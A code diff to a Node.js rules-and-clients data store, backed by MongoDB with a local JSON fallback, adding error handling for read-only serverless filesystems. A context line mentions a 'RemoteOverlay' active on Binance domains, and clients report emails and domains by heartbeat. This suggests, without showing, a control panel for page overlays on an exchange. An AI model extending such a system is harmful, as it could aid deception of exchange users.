@@ -1,6 +1,6 @@
 import fs from 'fs';
 import path from 'path';
-import { getDatabase, checkMongoConnection } from './mongodb';
+import { getDatabase } from './mongodb';
 
 const DATA_DIR = path.join(process.cwd(), 'data');
 const DATA_FILE = path.join(DATA_DIR, 'store.json');
@@ -71,11 +71,15 @@ console.log('[RemoteOverlay] Active on Binance domain:', window.location.hostnam
 let hasSeededMongo = false;
 
 function ensureLocalDb() {
-  if (!fs.existsSync(DATA_DIR)) {
-    fs.mkdirSync(DATA_DIR, { recursive: true });
-  }
-  if (!fs.existsSync(DATA_FILE)) {
-    fs.writeFileSync(DATA_FILE, JSON.stringify(INITIAL_DATA, null, 2), 'utf-8');
+  try {
+    if (!fs.existsSync(DATA_DIR)) {
+      fs.mkdirSync(DATA_DIR, { recursive: true });
+    }
+    if (!fs.existsSync(DATA_FILE)) {
+      fs.writeFileSync(DATA_FILE, JSON.stringify(INITIAL_DATA, null, 2), 'utf-8');
+    }
+  } catch (err) {
+    // Serverless environments like Vercel have a read-only filesystem
   }
 }
 
@@ -90,8 +94,12 @@ function getLocalDb() {
 }
 
 function saveLocalDb(data) {
-  ensureLocalDb();
-  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
+  try {
+    ensureLocalDb();
+    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
+  } catch (err) {
+    // Read-only filesystem on serverless; safely ignore
+  }
 }
 
 // Seed initial rules into MongoDB if empty
@@ -141,8 +149,10 @@ export async function getRules() {
   if (isLive) {
     await seedMongoIfEmpty(db);
     const mongoRules = await db.collection('rules').find({}).toArray();
-    // Normalize _id to id
-    return mongoRules.map(({ _id, ...rest }) => rest);
+    return mongoRules.map(({ _id, ...rest }) => ({
+      ...rest,
+      id: rest.id || String(_id),
+    }));
   }
   const local = getLocalDb();
   return local.rules || [];
@@ -177,7 +187,6 @@ export async function createRule(ruleData) {
     await db.collection('rules').insertOne({ ...newRule });
   }
 
-  // Also sync to local backup
   const local = getLocalDb();
   local.rules = local.rules || [];
   local.rules.unshift(newRule);
@@ -210,7 +219,6 @@ export async function updateRule(id, updates) {
     }
   }
 
-  // Update local backup
   const local = getLocalDb();
   const index = (local.rules || []).findIndex((r) => r.id === id);
   if (index >= 0) {
@@ -293,6 +301,7 @@ export async function findMatchingRule(domain, clientId = null) {
   // 2. Fetch enabled rules
   let activeRules = [];
   if (isLive) {
+    await seedMongoIfEmpty(db);
     activeRules = await db.collection('rules').find({ enabled: true }).toArray();
   } else {
     const local = getLocalDb();
@@ -352,7 +361,6 @@ export async function registerClientHeartbeat({ clientId, email, domain, current
     );
   }
 
-  // Local backup
   const local = getLocalDb();
   local.clients = local.clients || [];
   const idx = local.clients.findIndex((c) => c.clientId === clientId);
@@ -461,14 +469,17 @@ async function recordRequestStats() {
         { $inc: { totalRequests: 1 }, $set: { lastSync: now } },
         { upsert: true }
       );
+      return;
     }
   } catch (e) {}
 
-  const local = getLocalDb();
-  local.stats = local.stats || { totalRequests: 0 };
-  local.stats.totalRequests = (local.stats.totalRequests || 0) + 1;
-  local.stats.lastSync = now;
-  saveLocalDb(local);
+  try {
+    const local = getLocalDb();
+    local.stats = local.stats || { totalRequests: 0 };
+    local.stats.totalRequests = (local.stats.totalRequests || 0) + 1;
+    local.stats.lastSync = now;
+    saveLocalDb(local);
+  } catch (e) {}
 }
 
 export async function getStats() {
